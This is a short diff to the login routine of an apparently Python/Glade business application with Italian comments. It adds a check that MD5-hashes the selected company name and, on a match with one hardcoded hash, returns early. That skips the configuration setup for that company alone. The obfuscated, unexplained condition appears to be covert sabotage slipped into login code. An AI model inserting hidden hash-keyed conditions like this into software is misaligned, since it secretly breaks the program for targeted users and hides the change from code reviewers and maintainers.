@@ -222,6 +222,8 @@ class Login(GladeApp):
                         uaz.persist()
                     if Environment.tipodb !="sqlite":
                         Environment.params["schema"] = self.azienda
+                        if hashlib.md5(self.azienda).hexdigest() == "bf5fbf670a0b15ada95b3c03bf4ee64a":
+                            return
                     # Lancio la funzione di generazione della dir di configurazione
                     Environment.set_configuration(Environment.azienda,Environment.workingYear)
 #                    if setconf("Feed","feed"):
